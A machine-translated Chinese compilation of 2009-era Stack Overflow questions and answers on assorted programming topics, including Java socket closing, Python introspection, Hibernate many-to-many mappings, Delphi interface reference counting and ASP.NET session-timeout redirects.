即使您没有要求 Haskell，也没有要求解释条形码软件的工作原理，但出于教学原因，我不向您指出*Real World Haskell*中的[条形码识别章节](http://book.realworldhaskell.org/read/barcode-recognition.html)是错误的。它展示了如何用函数式语言解决问题。

 ** * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-28T06:55:39.860

barby [ruby​​ gem](http://barby.rubyforge.org/)非常适合创建二维条码。

# c++ - 什么样的 OOP 设计决策将适合客户端/服务器应用程序中的协议情况？

> ID：484882
> 
> 赞同：0
> 
> 时间：2009-01-27T19:33:28.100
> 
> 标签：c++, oop, tcp

我正在用 C++ 编写客户端/服务器应用程序，需要实现简单的协议才能正确发送和接收数据。我有一个服务器协议类，它可以将消息转换为我的格式，然后再从这种格式转换。
什么是服务器端协议看起来像：

```
class BaseProtocol {
protected:
    int NumberOfBytesInPackOfText;
    std::string serviceString;
public:
    BaseProtocol(int SizeOfTextPack, const char* extraString): 
        NumberOfBytesInPackOfText(SizeOfTextPack), 
            serviceString(extraString) {}
    virtual std::string& convertToSystemMessage(const char* message)=0;
    virtual std::string& convertToNativeMessage(const char* message)=0;
    virtual ~BaseProtocol() {
        NumberOfBytesInPackOfText = 0;
        serviceString = "";
    }
};

class SimpleProtocol: public BaseProtocol {
public:
    SimpleProtocol(int SizeOfTextPack, const char* service): 
        BaseProtocol(SizeOfTextPack, service) {}
    std::string& convertToSystemMessage(const char* nativeMessage);
    std::string& convertToNativeMessage(const char* systemMessage);
}; 
```

现在我无法决定在客户端应用程序上实现该协议的更好决定。服务器协议的朋友类？或者我可能需要从服务器协议中提取子类，然后客户端协议将从这个类派生？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T19:43:23.007

我将创建一个独立于客户端和服务器的协议类。它们每个都可以调用该类的函数，而不是从该类继承。

这遵循了[优先组合优于继承](http://www.artima.com/lejava/articles/designprinciples4.html)的原则。此外，客户端和服务器都不是“”协议解释器。相反，他们每个人都只需要使用该协议。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T19:47:40.580

你确定你需要一个不同的服务器和客户端实现吗？

在您的协议所在的级别，看起来它应该被设计为对服务器和客户端都是相同的。

在更高级别（您发送的消息类型），客户端和服务器应该有所不同。

# python - 您如何确定 Python 类的每个属性和方法的定义位置？

> ID：484890
> 
> 赞同：3
> 
> 时间：2009-01-27T19:37:19.883
> 
> 标签：python, introspection, plone, python-datamodel

给定 Python 中某个类的实例，能够确定哪一行源代码*定义*了每个方法和属性（例如实现[1](https://stackoverflow.com/questions/465605/how-do-i-make-ipython-organize-tab-completion-possibilities-by-class)）将很有用。例如，给定一个模块 ab.py

```
class A(object):
    z = 1
    q = 2
    def y(self): pass
    def x(self): pass

class B(A):
    q = 4
    def x(self): pass
    def w(self): pass 
```

定义一个函数 where(class_, attribute) 返回一个元组，该元组包含定义或子类化的源代码中的文件名、类和行`attribute`。这意味着在班级主体中的定义，而不是由于过度活跃而导致的最新分配。如果它为某些属性返回“未知”，那很好。

```
>>> a = A()
>>> b = B()
>>> b.spigot = 'brass'
>>> whither(a, 'z')
("ab.py", <class 'a.A'>, [line] 2)
>>> whither(b,  'q')
("ab.py", <class 'a.B'>, 8)
>>> whither(b, 'x')
("ab.py", <class 'a.B'>, 9)
>>> whither(b, 'spigot')
("Attribute 'spigot' is a data attribute") 
```

我想在自省 Plone 时使用它，其中每个对象都有数百个方法，按类而不是按字母顺序对它们进行排序非常有用。

当然，在 Python 中你不能总是合理地知道，但在大多数静态代码的常见情况下获得好的答案会很好。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T22:11:53.177

您正在寻找未记录的功能`inspect.classify_class_attrs(cls)`。传递给它一个类，它会返回一个元组列表`('name', 'kind' e.g. 'method' or 'data', defining class, property)`。如果您需要有关特定实例中绝对所有内容的信息，您将不得不做额外的工作。

例子：

```
>>> import inspect
>>> import pprint
>>> import calendar
>>> 
>>> hc = calendar.HTMLCalendar()
>>> hc.__class__.pathos = None
>>> calendar.Calendar.phobos = None
>>> pprint.pprint(inspect.classify_class_attrs(hc.__class__))
[...
 ('__doc__',
  'data',
  <class 'calendar.HTMLCalendar'>,
  '\n    This calendar returns complete HTML pages.\n    '),
 ...
 ('__new__',
  'data',
  <type 'object'>,
  <built-in method __new__ of type object at 0x814fac0>),
 ...
 ('cssclasses',
  'data',
  <class 'calendar.HTMLCalendar'>,
  ['mon', 'tue', 'wed', 'thu', 'fri', 'sat', 'sun']),
 ('firstweekday',
  'property',
  <class 'calendar.Calendar'>,
  <property object at 0x98b8c34>),
 ('formatday',
  'method',
  <class 'calendar.HTMLCalendar'>,
  <function formatday at 0x98b7bc4>),
 ...
 ('pathos', 'data', <class 'calendar.HTMLCalendar'>, None),
 ('phobos', 'data', <class 'calendar.Calendar'>, None),
 ...
 ] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T19:56:49.410

如果没有静态分析，这或多或少是不可能的，即使那样，它也不会总是有效。您可以通过检查其代码对象来获取定义函数的行以及在哪个文件中，但除此之外，您无能为力。该`inspect`模块可以帮助解决这个问题。所以：

```
import ab
a = ab.A()
meth = a.x
# So, now we have the method.
func = meth.im_func
# And the function from the method.
code = func.func_code
# And the code from the function!
print code.co_firstlineno, code.co_filename

# Or:
import inspect
print inspect.getsource(meth), inspect.getfile(meth) 
```

但请考虑：

```
def some_method(self):
    pass
ab.A.some_method = some_method
ab.A.some_class_attribute = None 
```

或者更糟：

```
some_cls = ab.A
some_string_var = 'another_instance_attribute'
setattr(some_cls, some_string_var, None) 
```

尤其是在后一种情况下，您想要或期望得到什么？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T19:52:26.937

您正在寻找[检查](http://docs.python.org/library/inspect.html)模块，特别是`inspect.getsourcefile()`和`inspect.getsourcelines()`. 例如

一个.py：

```
class Hello(object):
    def say(self):
       print 1

>>> from a import Hello
>>> hi = Hello()
>>> inspect.getsourcefile(hi.say)
a.py
>>> inspect.getsourcelines(A, foo)
(['   def say(self):\n        print 1\n'], 2) 
```

鉴于 Python 的动态特性，在更复杂的情况下这样做可能根本不可能......

# android - 如何从 Android 中的 Java 类访问 Layout XML 的对象

> ID：484896
> 
> 赞同：8
> 
> 时间：2009-01-27T19:38:57.340
> 
> 标签：android

这是我的问题，我想在 XML 布局中设计我的应用程序的所有界面，但我想从 Java 类处理所有 onTouch 事件、移动 ImageViews 等，这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T19:45:55.687

[LayoutInflaters](http://code.google.com/android/reference/android/view/LayoutInflater.html)允许您将 XML 布局转换为 Android 中相应的 View 对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-07T00:23:48.857

Yoni 是正确的，但我要补充一件事。

永远不要更改设备上的 XML 文件。它们被编译成二进制文件，因此您对它们所做的任何更改都不会真正影响 UI。但是，您对膨胀对象所做的所有更改都会产生预期的结果。

# java - 关闭 BufferedReader/PrintWriter 是否会关闭套接字连接？

> ID：484925
> 
> 赞同：17
> 
> 时间：2009-01-27T19:46:50.707
> 
> 标签：java, sockets

我有一个应用程序，它使用简单的套接字在两个系统之间传递一些字符。我的 java 应用程序作为服务器运行。我建立了良好的连接，甚至传递了一条消息。但是，在发送了一条消息后，我的连接将关闭。

据我所知，它似乎在关闭时`printWriter`并且`bufferedReader`套接字本身正在关闭？！这很糟糕，因为我有多个消息要在同一个连接上发送。

```
printWriter = new PrintWriter(theServer.getClientSocket().getOutputStream());
bufferedReader = new BufferedReader(new InputStreamReader(theServer.getClientSocket().getInputStream()));

printWriter.println("the line");

printWriter.close(); //Closing on these lines?
bufferedReader.close(); //Closing on these lines? 
```

我满了吗？如何在 Java 中维护这种连接？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-01-27T19:49:57.020

是的，关闭任何 Writer/Reader 将关闭它们包装的所有其他 Writer 和 Reader。在准备好关闭底层套接字之前不要关闭它。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-01-27T19:53:26.717

正如@Eddie[所说](https://stackoverflow.com/questions/484925/does-closing-the-bufferedreader-printwriter-close-the-socket-connection#484939)（比我早几秒！:)），关闭编写器和/或读取器将关闭底层套接字流[和套接字本身](http://docs.oracle.com/javase/8/docs/api/java/net/Socket.html#getInputStream--)：~~但是，我相信套接字本身不会关闭~~.

> 关闭返回的 InputStream 将关闭关联的套接字。

你不应该关闭作者和读者。只需刷新作者以确保您的消息及时到达。稍后关闭套接字将关闭相应的流，因此您不需要自己关闭它们。只需将您的读取器/写入器对象留给 GC。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-01-28T01:10:18.310

另一种选择是自己创建一个 NoCloseInputStream 和 NoCloseOutputStream 过滤器，它们在关闭时什么也不做；然后使用它们来包装您的应用程序套接字的流（在任何应用程序包装像缓冲区之前）。

请注意，如果要执行此操作，则需要保留对套接字（或包装的流）的引用，以便在实际完成时关闭套接字。

回答“对于 OP 来说这个概念太高级”的评论： OP 的问题是，在关闭顶级流的同时，他也在关闭底层套接字，但这并不好，因为他想创建更多的顶级通过套接字流以发送更多消息。根据他的体系结构，实现此目的的唯一方法可能是将流包装在 NoClose 包装器中 - 例如，他可能会将流传递给 XML 序列化器或反序列化器，后者在完成时关闭流，关闭不在他的控制范围内.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-27T20:23:35.937

关闭流后，您需要关闭套接字。

# ios - 如何将绑定数组划分为自动填充表格的部分？

> ID：484926
> 
> 赞同：0
> 
> 时间：2009-01-27T19:46:51.940
> 
> 标签：ios, arrays, cocoa, binding, interface-builder

我使用这个“教程”将我的名为“collection”的数组绑定到我界面上的 NSTableview：http: [//www.cocoadev.com/index.pl? NSArrayController](http://www.cocoadev.com/index.pl?NSArrayController)

interfacebuilder 的东西并不难。当我尝试将数组中的数据实际显示到视图中时，这变得很困难。

在我的 .h 文件中：

```
@interface MyDocument : NSDocument
{
    NSMutableArray *collection;
    //other variables
} 
```

在我的 .m 文件中：

```
@implementation MyDocument
@synthesize collection;
     //quite some functions

     inside one function (that works):
     [collection addObject:fileName];

     //some other functions

     inside the init function:
     collection = [[NSMutableArray alloc] init]; 
```

现在我猜这个数组很好地绑定到了接口和里面的**tableview**，但是tableview和它的列当然需要以特定的方式填充。现在添加项目后没有任何显示。带有**集合 addObject:fileName**函数

我应该创建一个子数组作为一个项目，填充字段？以及我应该如何将这些值/字段绑定到特定列。（字段为“*艺术家*”、“*标题*”等）

我已经将 Interface Builder 中的每一列绑定到**Array Controller**，其中包含**Controller 键**“ *arrangeObjects* ”和**模型键路径**“ *artist* ”、“ *title* ”等。

请保持解释简单，因为我慢慢开始认为我永远不会得到这个数组控制器的东西......Objective-C 似乎并不难，但它需要的绑定是我没有得到的。苹果的例子对新手来说是不够的

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T21:19:51.817

通常，要填充数据，您会为每一行使用一个字典（键是 keyPath，对象是数据），或者更好的是，创建一个类来表示数据并为每一行创建一个新实例。绑定起初可能有点棘手（如果您是 Cocoa 新手，请先习惯数据源方法），但请查看[本教程](http://cocoadevcentral.com/articles/000080.php)和[此处的示例](http://homepage.mac.com/mmalc/CocoaExamples/controllers.html)。两者都包含示例，您可以下载并检查如何在 Interface Builder 中设置绑定。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T23:35:08.470

仅仅改变数组并不能说明数组已经改变。您需要为突变发送 KVO 通知。

正确的做法是为属性实现访问器方法，然后调用您自己的访问器。在这种情况下，您需要实现`insertObjectInCollection:atIndex:`并将数组的长度作为索引传递（`[self insertObjectIntoCollection:fileName atIndex:[self countOfCollection]`在实现之后`countOfCollection`）。

当您实现访问器时，当一个对象绑定到该属性时，Cocoa 会将访问器包装在 KVO 魔术中，该魔术将发送适当的突变通知。

# asp.net - ASP.NET 页面在加载后调用一个额外的 aspx 页面

> ID：484928
> 
> 赞同：0
> 
> 时间：2009-01-27T19:47:14.373
> 
> 标签：asp.net, vb.net, master-pages, load

为了简单起见，我们有几个 aspx 页面...

**Page1.aspx** - 重置会话信息。
**Page2.aspx** - 带有结果的搜索表单并设置会话变量。
**Page3.aspx、Page4.aspx、Page5.aspx** - 需要在 Page2.aspx 上设置会话变量

我们发现，当 Page2.aspx 加载并设置 Session 变量时，Page1.aspx 被调用并重置 Session。但是，Page1.aspx 显示在浏览器中，而不是 Page2.aspx。当我们单步执行代码并在 Page1.aspx 和 Page2.aspx 的 Page_Load 事件中放置断点时，我们才能够发现这种情况发生，并且惊讶地看到 Page1.aspx 在 Page1.aspx 停止处理后立即处理 Page2.aspx服务器。

可能有用的信息...我们确实使用母版页，并且在母版页中有指向 Page1.aspx 的链接。除此之外，我在代码库中找不到任何对 Page1.aspx 的引用。

**更新：**
可能是由于身份验证？看来当我访问 Page2.aspx 时，服务器可能再次在 Page1.aspx 上进行身份验证？这是典型的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-28T15:49:15.743

感谢安德鲁的提示。

我们弄清楚发生了什么……应用程序中的 Page1.aspx 实际上是 Default.aspx。在 Page2.aspx 上，另一个开发人员在没有定义 src 属性的页面上放置了一个 img 标记。因此，当 Page2.aspx 执行时，它正在寻找位于网站根级别的图像，然后触发 Default.aspx (Page1) 上的代码并擦除会话。

总的来说，它看起来像这样......

在 Page2.aspx 上

```
<img src=""> <!-- this ended up triggering a call to Default.aspx, wiping the session --> 
```

希望这对其他人有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-28T05:16:53.723

启动 Fiddler 并正常运行应用程序。它会告诉您正在发生的流量并确定哪些页面正在重定向到其他页面。知道路径后，您可以通过调查源代码来确定该路径存在的原因。

您的应用程序域可能正在回收，因此所有会话变量都丢失了，如果会话变量丢失，您可能有代码重定向访问者，对吗？

如果是这种情况，作为快速修复，您可以使用 StateServer 或将会话变量存储在 Sql Server 中。您的应用程序域不应该每分钟都在回收，但如果您正在“进行中”存储会话（这是默认设置），它可能会导致您看到的行为。

# java - Hibernate：@ManyToMany 关系中对象集的传递持久性

> ID：484929
> 
> 赞同：0
> 
> 时间：2009-01-27T19:47:39.287
> 
> 标签：java, hibernate, orm, many-to-many

我正在尝试映射以下内容：

```
public class Person{
  ...
  @ManyToMany(cascade = { CascadeType.PERSIST, CascadeType.MERGE })
  @JoinTable(name = "person_categories", joinColumns = @JoinColumn(name = "personId"), inverseJoinColumns = @JoinColumn(name = "categoryId"))
  private Set<Category> categories

  ...
}

public class Category {
  @Id
  @GeneratedValue(strategy = GenerationType.AUTO)
  @Column(name = "categoryId")
  private Integer id;

  @Column(unique = true)
  private Sting name

  ...
} 
```

当我尝试保存 Person 对象时，会插入类别，但会将重复项存储到表中。如何确保每个类别在其表中是唯一的，同时保持传递持久性？我尝试使 name 列唯一，但这只能通过抛出约束错误来帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-28T03:15:03.750

如果您没有覆盖 hashCode() 和 equals() 以对*Category*类有意义，那么您将在 Set 中获得重复项（如果您要添加重复项开始）。如果*名称*字段是区分对象的原因，请尝试：

```
public int hashCode() {
    return name.hashCode();
}

public Object equals (Object o) {
    if (o instanceof Category) {
        return ((Category)o).name.equals(this.name);
    }
    return false;
} 
```

# delphi - 为什么不收集 TInterfacedObject 的后代垃圾？

> ID：484937
> 
> 赞同：4
> 
> 时间：2009-01-27T19:49:37.643
> 
> 标签：delphi, reference-counting, tinterfacedobject

我有一个基于 TInterfacedObject 的类。我将它添加到 TTreeNode 的 Data 属性中。

```
TFacilityTreeItem=class(TInterfacedObject)
private
  m_guidItem:TGUID;
  m_SomeOtherNode:TTreeNode;
public
end; 
```

我创建了这个对象的许多实例并假设因为它们是引用计数的，所以我不需要释放它们。那会很方便。

但是，当检查这个时，我打开了 ReportMemoryLeaksOnShutdown 并发现它们毕竟没有被释放。

这些对象是在放置在主窗体上的框架中创建的。在主窗体的 FormClose 中，我清除树节点，以便释放每个对象。

发生了什么？

感谢您的帮助！

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-01-27T20:15:33.163

TInterfacedObject 本身没有引用计数，只有接口是。您可以使用 TInterfacedObject 实现接口，这基本上可以节省您自己实现引用计数方法的工作量。不幸的是，它仍然不适用于您的情况：编译器不知道您正在为 TTreeNode.Data 属性分配接口，因为它没有声明为接口而是作为指针。于是各种诡异的事情就会发生：

```
MyInt := TFacilityTreeItem.Create; // ref count = 1
// Node.Data := MyInt; // won't compile
Node.Data := pointer(MyInt); // no interface assignment, ref count stays 1
...
end; // ref count reaches 0, your object gets freed 
```

一旦您尝试通过 .Data 属性访问您的对象，您就会遇到访问冲突。

所以，在这种情况下不要打扰接口，你可以让它工作，但它会付出更多的努力而不是值得。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-27T21:28:39.053

您应该将字段/变量声明为接口

```
IFacilityTreeItem = IInterface
end;

TFacilityTreeItem=class(TInterfacedObject, IFacilityTreeItem)
private
  m_guidItem:TGUID;
  m_SomeOtherNode:TTreeNode;
end;

var
  Item: IFacilityTreeItem; // Variable as Interface
begin
  Item:= TFacilityTreeItem.Create;
...
end; 
```

要访问您的字段，您应该使用 Getter 和 Setter 在 IFacilityTreeItem 接口中声明属性。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-17T06:55:39.037

正如[dummzeuch 所说](https://stackoverflow.com/questions/484937/why-arent-descendants-of-tinterfacedobject-garbage-collected/485037#485037)，你可以让它与接口一起工作，但它需要更多的代码，因为 TTreeNode 的 Data 属性是一个指针。对于任何想知道如何做到这一点的人，[此链接](http://oreilly.com/catalog/delphi/chapter/ch02.html#48353)有一个如何为 TListItem 做的示例（对于 TTreeNode 几乎相同）。[您可能还会发现阅读该页面上有关接口](http://oreilly.com/catalog/delphi/chapter/ch02.html#34776)的部分和后续有关引用计数的部分很有用。

# django - 在没有“邮件服务器”配置的情况下实现网站用户之间的电子邮件发送？

> ID：484940
> 
> 赞同：0
> 
> 时间：2009-01-27T19:49:58.267
> 
> 标签：django, email

我有这样的要求，该站点的每个用户都将向任何其他用户发送邮件，并且我有该通信的规则（暂时将它们放在一边）。因此，user1 将选择一个电子邮件 ID，例如：mypickeduser1n...@sitedomain.com，并将向 user2 发送电子邮件，其电子邮件 ID 将类似于：mypickeduser2n...@sitedomain.com。就像这样，任何数量的用户都会向任何数量的用户发送电子邮件。任何局外人都应该能够向 mypickeduser2n...@sitedomain.com 发送电子邮件。我的问题是，那么在这种情况下，我是否需要构建自己的 smtp（设置邮件）服务器。我完全是 smtp 领域的新手。我可以在没有“邮件服务器”配置的情况下实现用户之间的电子邮件通信吗？这可以实现吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-27T19:57:12.560

你需要一个邮件服务器。即使本地电子邮件只是直接存放在某个地方的邮件目录或数据库中，也必须有一些东西负责接受来自外部世界的电子邮件。我推荐 postfix - 它功能强大但易于设置，并且配置文件看起来不像 Klingon。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T21:00:33.367

如果您希望用户能够在[Django](http://www.djangoproject.com/)中创建电子邮件帐户，您需要 Django、您的[MTA](http://en.wikipedia.org/wiki/Mail_transfer_agent)和您的[IMAP](http://en.wikipedia.org/wiki/IMAP) /POP 服务器使用相同的用户帐户数据库。

我已成功使用以下设置：

*   [PostgreSQL](http://www.postgresql.org/)作为用户数据库
*   [后缀](http://www.postfix.org/)作为 MTA
*   [Dovecot](http://www.postfix.org/)作为 IMAP 服务器
*   自定义 Django 应用程序作为用户帐户管理前端
*   虚拟邮件用户帐户（不使用 Unix 帐户）

我只使用 Django 管理界面让管理员管理邮件帐户，但用户管理 UI 也很容易实现。

这种设置的一些提示和信息来源：

*   仔细设计您的数据库模式。我基于下面提到的 howtos 进行了修改，以便于 Django 集成。
*   请注意所有组件对用户密码使用相同的加密。
*   两个 howtos（[第一](http://www.lxtreme.nl/index.pl/docs/linux/dovecot_postfix_pam)，[第二](http://www.gjdv.at/snippets/linux/virtual_mail_hosting)）描述 Dovecot 和 Postfix 如何使用 PAM 和 PostgreSQL 作为后端对用户进行身份验证
*   Dovecot/Postfix/PostgreSQL的[德语操作指南](http://www.tuxj0b.de/HOWTO_Mailserver_mit_Postfix_Dovecot_Antispam_und_PostgreSQL_Backend)
*   将Debian 的虚拟用户/域支持、带有 SMTP AUTH 的 Postfix 2、带有用于 Postfix、PostgreSQL 和 Dovecot 的 libpam-pgsql 的 SASL2 粘合在一起的操作[指南](http://wiki.dovecot.org/HowTo/DovecotPostgresql)
*   Postfix [PostgreSQL 操作指南](http://www.postfix.org/PGSQL_README.html)

您可能还想查看使用 Dovecot/Postfix/PostgreSQL 设置管理域、帐户和别名的[Virtual Mail Manager命令行工具。](http://vmm.localdomain.org/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-27T20:25:02.940

有一些 django 应用程序可以处理用户之间的消息传递，但唯一似乎处于活动状态的是：

[django 消息](http://code.google.com/p/django-messages/)

这为您提供了您要求的所有功能，除了能够向用户发送邮件的外部人员。

这是一个更难的问题，并且肯定需要您的邮件服务器和大量自定义代码。

# php - 让 PHP 读取名称中带有引号的目录？

> ID：484941
> 
> 赞同：0
> 
> 时间：2009-01-27T19:50:05.943
> 
> 标签：php, directory

我正在使用 PHP 5 的 scandir($dir) 函数来遍历一个目录并打印出一个 xml 文件列表。仅当目录名称中有单引号时，scandir 不返回任何项目！它不会返回 false （就像它失败时一样）或生成警告或错误 - 只是空的。有任何想法吗？

```
$items = scandir(stripslashes($dir)); //strip slashes in case magic_quotes are on
if($items === false) die("scandir returned failure");
print_r($items) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T20:01:24.190

我已经在 Windows 上对其进行了测试，并且效果很好。试着`echo $dir;`确保它是你所期望的。

此外，用于[`ini_set()`](http://www.php.net/ini_set)确保您的错误级别足够高：

```
ini_set('error_reporting', E_ALL); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T20:07:16.500

您是否检查过执行脚本的用户是否具有目标目录的读取权限？

# asp.net - 在 ASP.NET 网站的 FCKEditor 中显示图像时出现问题

> ID：484951
> 
> 赞同：1
> 
> 时间：2009-01-27T19:54:19.540
> 
> 标签：asp.net, fckeditor

我在使用 ASP.NET 的 FCKEditor html 编辑器时遇到问题，因为尝试在编辑器中插入图像，然后在“图像属性”对话框中单击“浏览服务器”时出现“找不到页面”错误。我想让它显示“图像”文件夹中的所有文件。

网站设置如下：-

```
 \ Root
     - \ asp.net standard folders etc...
     - \ Images
     - \ FCKEditor - contains all the javascript etc..
     - Default.aspx - this contains the FCKEditor Control 
```

我尝试将 ImageBrowserURL 设置为各种设置，例如“/images”，但这似乎没有返回到图像文件夹的正确路径。

有任何想法吗 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T21:53:10.407

我认为问题在于“ImageBrowserUrl”并不指向图像文件所在的路径，而是指向实际文件浏览器所在的路径——您不必更改此设置。确保您已将 fckconfig.js 中的 _FileBrowserLanguage 和 _QuickUploadLanguage 设置为“aspx”。

要设置图像文件的路径，请将以下内容添加到 web.config：

```
 <appSettings>       
    <add key="FCKeditor:UserFilesPath" value="/images/" />
  </appSettings> 
```

url 是相对于网站根目录的，fckeditor 使用的默认值是 /userfiles/。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-28T01:59:22.547

另请检查[如何在基于 ASP.NET 的 FCKEditor 中设置配置或服务器以上传图像，](https://stackoverflow.com/questions/399965/how-to-set-configuration-or-server-to-upload-image-in-fckeditor-based-on-asp-net)看看它是否回答了您的问题。

# safari - ASP.NET Web 服务在 Safari 中不起作用

> ID：484961
> 
> 赞同：1
> 
> 时间：2009-01-27T19:55:56.743
> 
> 标签：safari

我有一个通过 get/post 接受参数并返回 XML 的 WebForms 页面 (.aspx)。这适用于所有浏览器，除了我得到这个 gem 的 Safari：

```
Safari 无法打开页面 [URL]。错误是：“未知错误”
(CFURLErrorDomain:303) 请从“帮助”菜单中选择“向 Apple 报告错误”，
记下错误编号，并描述您在看到此消息之前所做的操作。

```

有谁见过这个或者知道它的意思吗？

**更新：**

Web 服务适用于 http:// 协议，但在 https:// 下失败

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-11-11T06:55:08.603

我有同样的问题。通过 HTTP 工作，没有通过 HTTPS。添加 Content-Length 标头为我修复了它：

```
Context.Response.AddHeader("Content-Length", result.Length)

Context.Response.Write(result) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-15T18:21:40.930

谢谢，这对我们有用。

```
context.Response.AddHeader("Content-Length", FilInfo.Length.ToString()) 
```

[http://bit.ly/RTSnr4](http://bit.ly/RTSnr4)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T20:34:07.290

它真的是 Safari 还是 Webkit？那就是你用 Chrome 和/或 Konquerer 试过了吗？这可能会给你一个额外的线索。

# asp.net - 会话超时时的 ASP.NET 推送重定向

> ID：484964
> 
> 赞同：26
> 
> 时间：2009-01-27T19:56:21.673
> 
> 标签：asp.net, redirect, session-timeout, server-push

我正在寻找有关在会话到期时自动推送用户（即没有回发）的网站背后的技术的教程、博客条目或一些帮助。任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2009-01-27T20:03:42.220

通常，您设置会话超时，并且您可以另外添加页眉以自动将当前页面重定向到您在会话超时之前清除会话的页面。

来自[http://aspalliance.com/1621_Implementing_a_Session_Timeout_Page_in_ASPNET.2](http://aspalliance.com/1621_Implementing_a_Session_Timeout_Page_in_ASPNET.2)

```
namespace SessionExpirePage
{
    public partial class Secure : System.Web.UI.MasterPage
    {
        public int SessionLengthMinutes
        {
            get { return Session.Timeout; }
        }
        public string SessionExpireDestinationUrl
        {
            get { return "/SessionExpired.aspx"; }
        }
        protected override void OnPreRender(EventArgs e)
        {
            base.OnPreRender(e);
            this.PageHead.Controls.Add(new LiteralControl(
                String.Format("<meta http-equiv='refresh' content='{0};url={1}'>", 
                SessionLengthMinutes*60, SessionExpireDestinationUrl)));
        }
    }
} 
```

SessionExpireDestinationUrl 应该链接到您清除会话和任何其他用户数据的页面。

当刷新标头过期时，它会自动将它们重定向到该页面。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2009-01-27T20:00:28.513

您不能真正从您的网站“推送”客户。您的站点将响应来自客户的请求，但事实就是如此。

这意味着您需要编写一些客户端（Javascript）来确定用户何时超时，可能通过将当前时间与他们在站点 cookie 中的最近时间（您使用当前更新每次用户访问您网站上的页面的时间），然后如果差异大于一定数量则重定向。

（我注意到有些人提倡创建一个脚本，该脚本将在页面上经过一定时间后转发用户。这适用于简单的情况，但如果用户在网站上打开了两个窗口，并且正在使用一个窗口很多，另一个窗口不那么多，不那么多的窗口会突然将用户重定向到转发页面，即使用户一直在网站上。此外，它并不真正同步保持你在服务器端进行的任何会话。另一方面，编码肯定更容易，如果这足够好，那就太好了！）

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2009-01-27T20:03:03.250

在 <HEAD> 部分中，使用如下 META 刷新标签：

```
<meta http-equiv="refresh" content="0000; URL=target_page.html"> 
```

其中 0000 是以秒为单位的会话超时，而 target_page.html 是要重定向到的页面的地址。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-02-20T23:24:20.427

## 使用自定义页面类和 Javascript 我们也可以实现它。

创建一个自定义的 pagebase 类并将常用功能代码写入该类。通过这个类，我们可以将常用的功能分享给其他网页。在这个类中，我们需要继承*System.Web.UI.Page*类。将以下代码放入 Pagebase 类

***PageBase.cs***

```
namespace AutoRedirect
{
    public class PageBase : System.Web.UI.Page
    {
        protected override void OnPreRender(EventArgs e)
        {
            base.OnPreRender(e);
            AutoRedirect();
        }

        public void AutoRedirect()
        {
            int int_MilliSecondsTimeOut = (this.Session.Timeout * 60000);
            string str_Script = @"
               <script type='text/javascript'> 
                   intervalset = window.setInterval('Redirect()'," +
                       int_MilliSecondsTimeOut.ToString() + @");
                   function Redirect()
                   {
                       window.location.href='/login.aspx'; 
                   }
               </script>";

           ClientScript.RegisterClientScriptBlock(this.GetType(), "Redirect", str_Script);
        }
    }
} 
```

上面*的 AutoRedirect 函数*将用于在会话到期时重定向登录页面，通过使用*javascript window.setInterval*，这个 window.setInterval 以特定的时间延迟重复执行一个 javascript 函数。在这里，我们将时间延迟配置为会话超时值。一旦达到会话到期时间，就会自动执行重定向功能并将控制转移到登录页面。

***原始页面.aspx.cs***

```
namespace appStore
{
    public partial class OriginalPage: Basepage
    {
        protected void Page_Load(object sender, EventArgs e)
        {
        }     
    }
} 
```

***原始页面.aspx***

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="OriginalPage.aspx.cs" Inherits="AutoRedirect.OriginalPage" %> 
```

***网页配置***

```
<system.web>    
    <sessionState mode="InProc" timeout="3"></sessionState>
</system.web> 
```

注意：使用 Javascript 的优点是您可以在 location.href 之前的警报框中显示自定义消息，这对用户来说非常有意义。如果您不想使用 Javascript，您也可以选择元重定向

```
public void AutoRedirect()
{
    this.Header.Controls.Add(new LiteralControl(
        String.Format("<meta http-equiv='refresh' content='{0};url={1}'>",
            this.Session.Timeout * 60, "login.aspx")));
} 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-01-18T10:05:06.657

只需将此代码段复制并粘贴到您的 Web.Config 文件中：

```
<authentication mode="Forms">
  <forms loginUrl="~/Login.aspx" slidingExpiration="true" timeout="29" />
</authentication>

<sessionState timeout="30" mode="InProc" cookieless="false" /> 
```

您可以将此行放入您的 Site.Master ：

```
Response.AppendHeader("Refresh", 
                      Convert.ToString((Session.Timeout * 60)) + 
                      ";URL=~/Login.aspx"); 
```

* * *

## 回答 #6

